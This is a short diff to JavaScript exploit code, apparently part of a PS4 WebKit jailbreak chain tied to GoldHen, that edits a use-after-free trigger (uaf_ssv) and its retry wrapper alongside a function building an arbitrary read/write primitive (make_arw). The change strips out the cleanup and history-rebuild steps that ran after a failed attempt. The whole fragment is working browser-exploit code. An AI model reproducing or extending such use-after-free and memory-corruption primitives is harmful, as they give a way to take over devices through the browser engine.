@@ -274,16 +274,7 @@ async function uaf_ssv(fsets, index, save_pop = false) {
     });
 
     history.back();
-    try {
-        await pop_promise;
-    } catch (error) {
-        // Clean up a failed UAF attempt before the retry. In particular,
-        // remove the blur handler before removing the focused input.
-        input.removeEventListener('blur', onblur);
-        input.remove();
-        foo.remove();
-        throw error;
-    }
+    await pop_promise;
     input.removeEventListener('blur', onblur);
 
     // debug_log('done await popstate');
@@ -781,18 +772,13 @@ async function make_arw(reader, view2, pop) {
     make_arw._buffer = bt.buffer;
 }
 
-// Retry UAF attempts with a fresh history entry after the specific
-// popstate-before-blur race. The previous attempt has already consumed the
-// state2 entry, so retrying without rebuilding it can walk the history stack.
+// UAF retry wrapper for improved stability with GoldHen v2.4b18.8
 async function uaf_ssv_with_retry(fsets, index, save_pop = false, maxRetries = 3) {
     for (let attempt = 1; attempt <= maxRetries; attempt++) {
         try {
             return await uaf_ssv(fsets, index, save_pop);
         } catch (e) {
             if (attempt === maxRetries) throw e;
-            if (e instanceof DieError && String(e.message).includes('pop came before blur')) {
-                history.pushState('state2', '', original_loc);
-            }
             log(`UAF attempt ${attempt}/${maxRetries} failed, retrying...`);
             gc();
             await sleep(100);
